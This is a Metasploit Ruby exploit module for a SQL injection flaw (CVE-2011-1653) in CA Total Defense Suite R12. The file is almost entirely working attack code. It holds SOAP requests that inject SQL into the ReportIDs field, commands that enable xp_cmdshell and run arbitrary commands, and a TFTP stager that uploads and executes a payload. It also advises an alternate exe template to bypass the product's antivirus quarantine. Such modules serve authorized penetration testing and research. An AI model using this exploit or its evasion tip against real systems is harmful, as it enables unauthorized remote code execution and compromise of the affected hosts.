# $Id: ca_totaldefense_regeneratereports.rb 13810 2011-10-02 17:03:23Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;CA Total Defense Suite reGenerateReports Stored Procedure SQL Injection&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an sql injection flaw in CA Total Defense Suite R12.
                When supplying a specially crafted soap request to &#039;/UNCWS/Management.asmx&#039;, an
                attacker can abuse the reGenerateReports stored procedure by injecting arbitrary sql
                statements into the ReportIDs element.
 
                CA Total Defense Suite R12. CA&#039;s Total Defense Suite real-time protection
                will quarantine the default framework executable payload. Choosing an alternate
                exe template will bypass the quarantine.
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13810 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-134&#039; ],
                    [ &#039;OSVDB&#039;, &#039;74968&#039;],
                    [ &#039;CVE&#039;, &#039;2011-1653&#039; ],
                ],
            &#039;Targets&#039;   =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        }
                    ]
                ],
            &#039;Privileged&#039; => true,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;DisclosureDate&#039; => &#039;Apr 13 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                Opt::RPORT(34443),
                OptBool.new(&#039;SSL&#039;,   [ true, &#039;Use SSL&#039;, true ]),
                OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, "" ])
            ], self.class)
    end
 
    def windows_stager
 
        exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
         
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        execute_cmdstager({ :temp => &#039;.&#039;})
        @payload_exe = payload_exe
         
        print_status("Attempting to execute the payload...")
        execute_command(@payload_exe)
     
    end
 
    def execute_command(cmd, opts = {})
 
        inject = [
                "&#039;&#039;) exec master.dbo.sp_configure &#039;show advanced options&#039;, 1;reconfigure;--",
                "&#039;&#039;) exec master.dbo.sp_configure &#039;xp_cmdshell&#039;,1;reconfigure;--",
                "&#039;&#039;) exec master.dbo.xp_cmdshell &#039;cmd.exe /c #{cmd}&#039;;--",
            ]
             
        inject.each do |sqli|
 
        soap = %Q|<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
    <soap12:Body>
        <reGenerateReports xmlns="http://tempuri.org/">
            <EnterpriseID>msf</EnterpriseID>
            <ReportIDs>#{sqli}</ReportIDs>
            <UserID>187</UserID>
        </reGenerateReports>
    </soap12:Body>
</soap12:Envelope>
        |
 
        res = send_request_cgi(
            {
                &#039;uri&#039;   =>  &#039;/UNCWS/Management.asmx&#039;,
                &#039;method&#039; => &#039;POST&#039;,
                &#039;version&#039; => &#039;1.0&#039;,
                &#039;ctype&#039; => &#039;application/soap+xml; charset=utf-8&#039;,
                &#039;data&#039; => soap,
            }, 5)
         
        if ( res and res.body =~ /SUCCESS/ )
                #print_good("Executing command...")
            else
                raise RuntimeError, &#039;Something went wrong.&#039;
            end
        end
 
    end
 
    def exploit
 
        if not datastore[&#039;CMD&#039;].empty?
            print_status("Executing command &#039;#{datastore[&#039;CMD&#039;]}&#039;")
            execute_command(datastore[&#039;CMD&#039;])
            return
        end
 
        case target[&#039;Platform&#039;]
            when &#039;win&#039;
                windows_stager
            else
                raise RuntimeError, &#039;Target not supported.&#039;
        end
 
        handler
 
    end
end
__END__
POST /UNCWS/Management.asmx HTTP/1.1
Host: 192.168.31.129
Content-Type: application/soap+xml; charset=utf-8
Content-Length: length
 
<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
    <soap12:Body>
        <reGenerateReports xmlns="http://tempuri.org/">
            <EnterpriseID>string</EnterpriseID>
            <ReportIDs>string</ReportIDs>       <--boom!!
            <UserID>long</UserID>
        </reGenerateReports>
    </soap12:Body>
</soap12:Envelope>



